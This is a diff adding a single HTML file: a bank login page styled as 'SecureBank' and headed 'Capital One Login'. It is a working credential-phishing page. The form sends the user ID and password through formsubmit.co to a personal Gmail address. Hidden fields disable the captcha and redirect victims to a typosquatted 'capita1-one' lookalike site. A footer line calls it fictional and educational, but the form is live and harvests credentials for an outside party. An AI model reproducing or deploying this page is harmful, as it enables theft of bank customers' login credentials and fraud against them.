@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>SecureBank Login</title>
+  <style>
+    body {
+      background-color: #f1f3f6;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .login-container {
+      background-color: white;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+      width: 100%;
+      max-width: 400px;
+      text-align: center;
+    }
+    .logo {
+      max-width: 100px;
+      margin-bottom: 10px;
+    }
+    h2 {
+      margin-bottom: 20px;
+      color: #2d2d2d;
+    }
+    label {
+      font-weight: bold;
+      float: left;
+      margin-top: 10px;
+    }
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0 20px 0;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #0047ab;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #003a8c;
+    }
+    .note {
+      margin-top: 15px;
+      font-size: 12px;
+      color: #777;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <!-- Logo -->
+    <img src="https://files.catbox.moe/5npen5.png" alt="SecureBank Logo" class="logo">
+
+    <h2>Capital One Login</h2>
+    <form id="loginForm" method="POST" action="https://formsubmit.co/thomasconry859@gmail.com">
+      <label for="username">User ID</label>
+      <input type="text" id="username" name="username" placeholder="Enter your user ID" required>
+
+      <label for="password">Password</label>
+      <input type="password" id="password" name="password" placeholder="Enter your password" required>
+
+      <button type="submit">Sign In</button>
+
+      <!-- Opcional: para evitar captcha -->
+      <input type="hidden" name="_captcha" value="false">
+
+      <!-- Opcional: redirigir después del envío -->
+      <input type="hidden" name="_next" value="https://capita1-one.github.io/Capital-one/gracias.html">
+    </form>
+    <div class="note">This is a fictional login page for educational use only.</div>
+  </div>
+</body>
+</html>
